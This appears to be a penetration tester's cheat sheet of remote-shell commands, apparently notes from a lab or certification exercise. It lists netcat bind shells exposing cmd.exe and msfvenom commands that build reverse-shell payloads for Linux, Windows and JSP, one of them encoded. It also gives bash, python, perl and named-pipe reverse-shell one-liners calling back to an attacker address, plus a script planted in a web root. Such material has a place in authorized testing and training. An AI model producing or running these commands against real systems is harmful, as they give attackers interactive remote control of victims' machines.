=================================== 
Reverse Ports: 80, 443, 53 

=================================== 
Bind
nc -nlvp 443 -e cmd.exe    ..Windows: Share cmd (to anyone)
nc -nv 192.168.200.5 443      ..Linux: Connect to remote cmd

=================================== 
msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.162.46 LPORT=4443 -f elf > shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.162.46 LPORT=443 -f exe > shell.exe
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.162.46 LPORT=443 -f exe > shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.162.46 LPORT=443 -e x86/shikata_ga_nai -f exe -o shellenc.exe
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.162.46 LPORT=443 -f raw > venomshell.jsp 

windows/shell/reverse_tcp            ..staged
windows/shell_reverse_tcp            ..non-staged
windows/x64/shell_reverse_tcp        ..staged
linux/x86/shell/reverse_tcp          ..linux 32bit staged
linux/x86/shell_reverse_tcp          ..non-staged
linux/x64/shell/reverse_tcp          ..staged

=================================== 
php
/home/boss/tools/privesc_windows/windows-php-reverse-shell.php

=================================== 
Reverse
nc -nv 192.168.162.46 443 -e /bin/bash
/bin/nc -e /bin/bash 192.168.162.46 80
netcat -e /bin/bash 192.168.162.46 443
bash -i >& /dev/tcp/192.168.162.46/443 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.162.46 443 > /tmp/f
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.162.46",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.162.46",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' 

cat <<EOF> /var/www/html/script.py
#!/usr/bin/env python
import os,socket,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.162.46",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
EOF

=================================== 
Catch a dying shell 
kali> vim perl.shell  
perl -e 'use Socket;$i="192.168.162.46";$p=445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 
kali> cat perl.shell | nc -lnvp 443   ..listen on 443, re-send to 445 
kali> nc -lvnp 445 

===================================
Consider: mxrootbash
